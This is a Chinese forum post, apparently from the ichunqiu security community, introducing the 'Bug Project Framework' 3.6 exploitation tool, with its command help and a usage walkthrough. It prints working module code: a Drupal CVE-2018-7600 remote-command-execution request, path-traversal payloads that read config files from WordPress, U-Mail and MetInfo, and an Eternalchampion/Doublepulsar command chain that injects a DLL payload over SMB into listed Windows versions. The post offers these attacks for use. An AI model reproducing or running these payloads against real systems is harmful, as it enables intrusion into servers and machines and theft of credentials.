[i春秋作家：降龙](https://bbs.ichunqiu.com/thread-40156-1-1.html?from=beef)  

  

## 0x01 前言

* * *

关于BPF框架的图形化界面是我在2017年4月份开始编写的，开发至今已有1年又1个月，但是由于图形化界面对于漏洞利用的便携性和简易性比较高，攻击性比较大，所以迫于多方面原因，图形化界面不会公开，在上周着手编写了这个3.6版本的命令行版本。

关于网络上流传的被泄露的3.0图形化版本，我说明一下，这个版本存在很多的bug，不只是模块语法的bug，而且被泄漏的版本被捆绑了很多木马，希望不要贸然下载，以免遭受不必要的损失！

## 0x02 项目简介

* * *

软件名称：Bug project Framework  
版本： 3.6  
  
作者： Fplyth0ner  
团队： Combie Security Team  
模块开发 Git：<https://github.com/Fplyth0ner-Combie/Bug-Project-Framework>

## 0x03 帮助

* * *

在BPF根命令行下：  
  
help 查询帮助  
  
reload 重新加载框架，此时会刷新全部模块  
  
search 搜索模块关键词并显示  
（ e.g. search ms17-010 ）  
searchall 显示所有模块  
  
use 使用模块  
（ e.g. use \buffer\ms17-010 Scan.bpf ）  
set shellcodes 配置默认Shellcode路径  
  
exit 退出BPF  
  
  
在BPF模块命令行下：  
  
help 查询帮助  
  
show options 查看当前模块参数以及配置情况  
  
set options 设置当前模块参数以及配置  
  
set shellcodes 配置默认Shellcode路径  
  
run 运行模块  
  
exit 退出当前模块  
  
当你输入除上述指定规定参数以外的命令时，BPF框架会将命令识别为系统命令，提交Windows操作系统进行处理  
  
HAPPY HACK ！GOOD LUCK ！  
2018.5.7 BY Fplyth0ner

## 0x04 上手操作  

* * *

  

首先我们打开命令行，切换到BPF框架所在文件夹，框架文件结构如下图：

![image.png](https://image.3001.net/images/20180511/15260217194859.png!small)

  

然后键入BPF框架主文件全名，并执行：

![image.png](https://image.3001.net/images/20180511/15260217253650.png!small)  

可以看到框架当前可调用 59 个Web Exploit模块，12 个Web Poc模块和33个 Buffer 模块。Web
Exploit模块提供Web应用漏洞的检查，Web
Poc模块提供Web应用漏洞检测，Buffer模块提供外部程序的调用，例如Python，Java等解释型语言的代码，或者是外部可执行文件的调用，操作灵活。

  

由于框架仅仅是给予模块一个执行环境，功能主要通过模块来实现，所以我们简单展示一下三种模块的代码。

## Web Exploit（Drupal核心远程代码执行漏洞）：

##  
  

<cs1mc>命令</cs1mc>

<cs2mc>输出文件名</cs2mc>

<zbz>2</zbz>

<bz1>

<sfjt>post</sfjt>

<dzkz>/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax</dzkz>

<cl>Connection: keep-alive

Accept-Encoding: gzip, deflate

Accept: */*

User-Agent: python-requests/2.18.4

Content-Length: 159</cl>

<demo>mail[#markup]=<cs1/> | tee
<cs2/>.txt&mail[#type]=markup&form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec</demo>

</bz1>

<bz2>

<sfjt>get</sfjt>

<demo>/<cs2/>.txt</demo>

</bz2>

<bz>CVE-2018-7600

Drupal核心远程代码执行漏洞

影响版本:

Drupal 6.x，7.x，8.x</bz>

  

  

## Web Poc（CMS Getshell 漏洞检测）：

  

[](https://bbs.ichunqiu.com/#)

<zbz>3</zbz>

<bz1>

<name>WordPress DB-Backup Plugin 任意文件下载</name>

<sfjt>get</sfjt>

<demo>/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php</demo>

<expjc>1</expjc>

<zjyz></zjyz>

<xxxz>define(</xxxz>

</bz1>

<bz2>

<name>U-Mail任意文件遍历/下载</name>

<sfjt>get</sfjt>

<demo>/webmail/client/mail/index.php?module=operate&action=attach-img-preview&d_url=file://C:\windows\win.ini&type=text/htm</demo>

<expjc>1</expjc>

<zjyz></zjyz>

<xxxz>[fonts]</xxxz>

</bz2>

<bz3>

<name>MetInfo 5.2 任意文件读取</name>

<sfjt>get</sfjt>

<demo>/include/thumb.php?x=1&y=/../../../config&dir=config_db.php</demo>

<expjc>1</expjc>

<zjyz></zjyz>

<xxxz>con_db_host</xxxz>

</bz3>

<bz>专为CMS通杀的任意文件读取漏洞做检测

直接输入 http://网址 即可开始检测</bz>

  

  

## Buffer（Eternalchampion）：  

  

<sfjt>inject</sfjt>

<ljfs>NB,NR,MR</ljfs>

<sctype>dll</sctype>

<cs1mc>IP地址</cs1mc>

<cs2mc>端口</cs2mc>

<cs3mc>攻击服务</cs3mc>

<cs4mc>系统版本</cs4mc>

<cs5mc>系统架构</cs5mc>

<zbz>5</zbz>

<bz1><cmd>Doublepulsar-1.3.1.exe --NetworkTimeout 60 --TargetIp <cs1/>
\--TargetPort <cs2/> \--Protocol SMB --Architecture <cs5/> \--Function
OutputInstall --OutputFile 1.bin</cmd></bz1>

<bz2><cmd>cj.exe</cmd></bz2>

<bz3><cmd>ping -n 3 127.1 >nul</cmd></bz3>

<bz4><cmd>Eternalchampion-2.0.0.exe --TargetIp <cs1/> \--TargetPort <cs2/>
\--ShellcodeBuffer <cj/> \--Protocol <cs3/> \--Target <cs4/></cmd></bz4>

<bz5><cmd>Doublepulsar-1.3.1.exe --TargetIp <cs1/> \--TargetPort 445
--DllPayload <sc/> \--Protocol SMB --Architecture <cs5/> \--Function
Rundll</cmd></bz5>

<bz> 上 下 对 应

端口： 139 445

攻击服务： NBT SMB

系统架构： X86 X64

系统版本：

XP_SP0SP1_X86

Windows XP Sp0 and Sp1, 32-bit

XP_SP2SP3_X86

Windows XP Sp2 and Sp3, 32-bit

XP_SP1_X64

Windows XP Sp1, 64-bit

XP_SP2_X64

Windows XP Sp2, 64-bit

SERVER_2003_SP0

Windows Sever 2003 Sp0, 32-bit

SERVER_2003_SP1

Windows Sever 2003 Sp1, 32-bit/64-bit

SERVER_2003_SP2

Windows Sever 2003 Sp2, 32-bit/64-bit

VISTA_SP0

Windows Vista Sp0, 32-bit/64-bit

VISTA_SP1

Windows Vista Sp1, 32-bit/64-bit

VISTA_SP2

Windows Vista Sp2, 32-bit/64-bit

SERVER_2008_SP0

Windows Server 2008 Sp0, 32-bit/64-bit

SERVER_2008_SP1

Windows Server 2008 Sp1, 32-bit/64-bit

SERVER_2008_SP2

Windows Server 2008 Sp2, 32-bit/64-bit

WIN7_SP0

Windows 7 Sp0, 32-bit/64-bit

WIN7_SP1

Windows 7 Sp1, 32-bit/64-bit

SERVER_2008R2_SP0

Windows Server 2008 R2 Sp0, 32-bit/64-bit

SERVER_2008R2_SP1

Windows Server 2008 R2 Sp1, 32-bit/64-bit

WIN8_SP0

Windows 8 Sp0, 32-bit/64-bit

</bz>

  

回到命令行界面，我们输入： Search 命令执行

![image.png](https://image.3001.net/images/20180511/15260222955711.png!small)  

搜索到21个可用模块，我们挑选第二个模块，使用 Use 命令进行模块使用

![image.png](https://image.3001.net/images/20180511/15260223053677.png!small)  

在该模块的提示符下，使用 show options 命令查看模块配置

![image.png](https://image.3001.net/images/20180511/15260223111552.png!small)  

使用 set options 修改模块配置，操作如下：

![image.png](https://image.3001.net/images/20180511/15260223185364.png!small)  

可以看到已经修改成功。

  
![image.png](https://image.3001.net/images/20180511/15260223237379.png!small)  

然后键入 run ，回车，即可测试指定目标。

  

如果想退出当前模块，输入：exit
即可回到BPF主提示符，关于更多其他类型的模块使用，和上述方法大致相同。同时，在BPF命令行下，本机系统命令也同样可以使用

![image.png](https://image.3001.net/images/20180511/1526022330510.png!small)  

## 0x05 项目支持

* * *

在未来，我会在Ichunqiu平台做一个BPF框架模块场景编写文章专栏，各位对模块编写的热情以及对BPF语法积极的高级利用，就是对BPF框架最大的支持！！

有问题大家可以留言哦，也欢迎大家到春秋论坛中来耍一耍
[>>>点击跳转](https://bbs.ichunqiu.com/portal.php?from=beef)  

